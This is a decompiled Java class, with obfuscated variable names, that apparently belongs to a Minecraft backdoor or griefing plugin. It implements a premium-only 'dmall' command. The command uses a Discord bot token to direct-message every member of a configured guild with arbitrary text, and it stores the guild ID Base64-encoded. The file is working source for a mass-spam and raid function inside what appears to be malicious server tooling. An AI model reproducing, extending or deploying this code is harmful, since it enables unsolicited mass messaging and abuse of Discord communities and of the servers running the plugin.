/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium.bot;

import com.minecraftforceop.jda.jda.api.entities.Guild;
import com.minecraftforceop.jda.jda.api.entities.PrivateChannel;
import java.util.Base64;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class DmallCommand
extends Command {
    public DmallCommand() {
        DmallCommand lllllllllllllIlIIIIllIIlIIlIlIlI;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    @Override
    public void execute(Core lllllllllllllIlIIIIllIIlIIIllIll, String lllllllllllllIlIIIIllIIlIIIllIlI, String[] lllllllllllllIlIIIIllIIlIIIlIllI, Player lllllllllllllIlIIIIllIIlIIIlIlIl) {
        if (lllllllllllllIlIIIIllIIlIIIllIll.premium.contains(lllllllllllllIlIIIIllIIlIIIlIlIl.getName())) {
            if (lllllllllllllIlIIIIllIIlIIIllIll.botEnabled) {
                byte[] lllllllllllllIlIIIIllIIlIIIllllI = Base64.getDecoder().decode(DataManager.getData().getString("id"));
                Guild lllllllllllllIlIIIIllIIlIIIlllIl = lllllllllllllIlIIIIllIIlIIIllIll.jda.getGuildById(new String(lllllllllllllIlIIIIllIIlIIIllllI));
                if (lllllllllllllIlIIIIllIIlIIIlllIl == null) {
                    lllllllllllllIlIIIIllIIlIIIlIlIl.sendMessage(Settings.PREFIX("The bot doesn't seem to be in the guild set! Use setguild"));
                } else if (lllllllllllllIlIIIIllIIlIIIlIllI.length <= 1) {
                    lllllllllllllIlIIIIllIIlIIIlIlIl.sendMessage(Settings.PREFIX("Enter a message to DM all users"));
                } else {
                    StringBuilder lllllllllllllIlIIIIllIIlIIlIIIII = new StringBuilder();
                    for (int lllllllllllllIlIIIIllIIlIIlIIIIl = 1; lllllllllllllIlIIIIllIIlIIlIIIIl != lllllllllllllIlIIIIllIIlIIIlIllI.length; ++lllllllllllllIlIIIIllIIlIIlIIIIl) {
                        lllllllllllllIlIIIIllIIlIIlIIIII.append(lllllllllllllIlIIIIllIIlIIIlIllI[lllllllllllllIlIIIIllIIlIIlIIIIl]).append(" ");
                    }
                    String lllllllllllllIlIIIIllIIlIIIlllll = String.valueOf(lllllllllllllIlIIIIllIIlIIlIIIII);
                    lllllllllllllIlIIIIllIIlIIIlllIl.getMembers().forEach(lllllllllllllIlIIIIllIIlIIIIlIll -> {
                        PrivateChannel lllllllllllllIlIIIIllIIlIIIIlIlI = lllllllllllllIlIIIIllIIlIIIIlIll.getUser().openPrivateChannel().complete();
                        lllllllllllllIlIIIIllIIlIIIIlIlI.sendMessage(lllllllllllllIlIIIIllIIlIIIlllll).complete();
                    });
                    lllllllllllllIlIIIIllIIlIIIlIlIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("All users received a DM saying ").append(Settings.RED).append((Object)lllllllllllllIlIIIIllIIlIIlIIIII))));
                }
            } else {
                lllllllllllllIlIIIIllIIlIIIlIlIl.sendMessage(Settings.PREFIX("The bot doesn't seem to be logged in! Use settoken"));
            }
        } else {
            lllllllllllllIlIIIIllIIlIIIlIlIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }
}

